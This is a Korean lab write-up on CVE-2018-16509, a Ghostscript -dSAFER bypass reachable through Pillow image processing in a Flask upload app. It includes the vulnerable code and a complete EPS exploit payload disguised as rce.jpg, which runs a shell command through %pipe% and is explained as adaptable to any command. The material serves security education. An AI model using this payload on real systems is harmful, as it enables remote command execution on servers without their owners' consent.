# Python PIL/Pillow를 통한 Ghostscript 원격 쉘 명령 실행 CVE-2018-16509

Ghostscript는 Adobe Systems의 PostScript 및 Portable Document Format (PDF) 페이지 설명 언어에 대한 인터프리터를 기반으로 하는 소프트웨어 스위트입니다. 어떤 이유로든 Ghostscript는 어떤 애플리케이션이 직접 사용하지 않더라도 프로덕션 서버에 존재합니다 (예: `/usr/local/bin/gs` 또는 `/usr/bin/gs`). 왜냐하면 Ghostscript는 다른 소프트웨어 (예: ImageMagick)의 종속성으로 설치되기 때문입니다. Ghostscript에는 여러 가지 취약점이 발견되었으며, 그 중 하나는 CVE-2018-16509입니다. 이는 Google Project Zero의 Tavis Ormandy가 발견한 취약점으로, PostScript에서 실패한 복원 (grestore)을 처리하여 LockSafetyParams를 비활성화하고 invalidaccess를 피함으로써 v9.24 이전의 Ghostscript에서 -dSAFER 우회를 이용해 임의의 명령을 실행할 수 있게 합니다. 이 취약점은 ImageMagick 라이브러리나 Ghotscript 래퍼가 있는 프로그래밍 언어의 이미지 라이브러리 (이 예제에서는 PIL/Pillow)를 통해 접근할 수 있습니다.

## 공격

서버에서 `touch /tmp/got_rce`를 실행하려면 [rce.jpg](rce.jpg) (특별히 제작된 EPS 이미지, 실제 JPG가 아님)를 업로드할 수 있습니다. 증명을 위해 `docker exec [CONTAINER_ID] ls -alt /tmp`를 실행할 수 있습니다. `CONTAINER_ID`를 얻으려면 `docker container ls`를 확인하십시오. 쉘 실행을 다른 명령으로 변경하려면 `rce.jpg`에서 `touch /tmp/got_rce`를 직접 변경할 수 있습니다.

## 분석

Tavis Ormandy가 [oss-security](https://seclists.org/oss-sec/2018/q3/142)에서 취약점에 대한 설명을 참조할 수 있습니다.

PIL/Pillow의 Ghostscript 래퍼 소스 코드는 [EPSImagePlugin.py](https://github.com/python-pillow/Pillow/blob/0adeb82e9886cdedb3917e8ddfaf46f69556a991/src/PIL/EpsImagePlugin.py)에서 확인할 수 있습니다.

This is the vulnerable code of `app.py`:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        file = request.files.get('image', None)  # POST 요청에서 'image' 파일을 가져옵니다.

        if not file:  # 파일이 없는 경우
            flash('이미지를 찾을 수 없습니다')  # 에러 메시지를 생성하여 플래시합니다.
            return redirect(request.url)  # 현재 페이지로 리다이렉트합니다.

        filename = file.filename  # 파일 이름을 가져옵니다.
        ext = path.splitext(filename)[1]  # 파일 이름에서 확장자를 추출합니다.

        if (ext not in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):  # 지원하지 않는 확장자인 경우
            flash('유효하지 않은 확장자')  # 에러 메시지를 생성하여 플래시합니다.
            return redirect(request.url)  # 현재 페이지로 리다이렉트합니다.

        tmp = tempfile.mktemp("test")  # 임시 파일을 생성합니다.
        img_path = "{}.{}".format(tmp, ext)  # 이미지의 경로를 설정합니다.

        file.save(img_path)  # 업로드된 파일을 저장합니다.

        img = Image.open(img_path)  # 이미지를 엽니다.
        w, h = img.size  # 이미지의 크기를 가져옵니다.
        ratio = 256.0 / max(w, h)  # 리사이징 비율을 계산합니다.

        resized_img = img.resize((int(w * ratio), int(h * ratio)))  # 이미지를 리사이징합니다.
        resized_img.save(img_path)  # 리사이징된 이미지를 저장합니다.

```

업로드된 파일의 내용은 `img = Image.open(img_path)`에 의해 로드됩니다. PIL은 이미지가 EPS 이미지인지 자동으로 감지합니다 (예: 파일 시작 부분에 `%!PS-Adobe-3.0 EPSF-3.0` 추가)하고 `EPSImagePlugin.py`의 `EpsImageFile` 클래스에서 _open()을 호출합니다. `raise IOError("cannot determine EPS bounding box")`를 피하기 위해 파일에 바운딩 박스를 추가해야 합니다 (예: `%%BoundingBox: -0 -0 100 100`).

EPS 이미지의 본문은 `subprocess`를 통해 Ghostscript 바이너리로 처리됩니다. 이는 `EPSImagePlugin.py`의 `Ghostscript` 함수에서 볼 수 있습니다.

```python
 # Ghostscript 명령어 생성
명령 = ["gs",
        "-q",                         # 조용한 모드
        "-g%dx%d" % 크기,             # 출력 기하학 설정 (픽셀)
        "-r%fx%f" % 해상도,           # 입력 DPI 설정 (인치당 도트)
        "-dBATCH",                    # 처리 후 종료
        "-dNOPAUSE",                  # 페이지 간 일시 중지 없음
        "-dSAFER",                    # 안전 모드
        "-sDEVICE=ppmraw",            # ppm 드라이버
        "-sOutputFile=%s" % 출력파일,  # 출력 파일
        "-c", "%d %d translate" % (-bbox[0], -bbox[1]),
                                     # 이미지 원점에 대한 조정
        "-f", 입력파일,              # 입력 파일
        "-c", "showpage",             # showpage (참고: https://bugs.ghostscript.com/show_bug.cgi?id=698272)
       ]



    ....

    try:
    with open(os.devnull, 'w+b') as devnull:
        startupinfo = None
        if sys.platform.startswith('win'):
            # Windows 운영체제에서는 subprocess의 STARTUPINFO를 설정
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        # subprocess.check_call 함수를 사용하여 명령어를 실행하고 입/출력을 devnull로 리디렉션
        subprocess.check_call(command, stdin=devnull, stdout=devnull, startupinfo=startupinfo)

```

위의 코드는 [Image.py](https://github.com/python-pillow/Pillow/blob/0adeb82e9886cdedb3917e8ddfaf46f69556a991/src/PIL/Image.py)에서 `load`가 호출될 때 호출됩니다. 따라서 이미지를 열기만 해도 취약점이 트리거되지 않습니다. `resize`, `crop`, `rotate`, `save`와 같은 함수는 `load`를 호출하고 취약점을 트리거합니다.

Tavis Ormandy의 POC와 결합하여 원격 쉘 명령 실행을 위한 `rce.jpg`를 제작할 수 있습니다.

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops
```
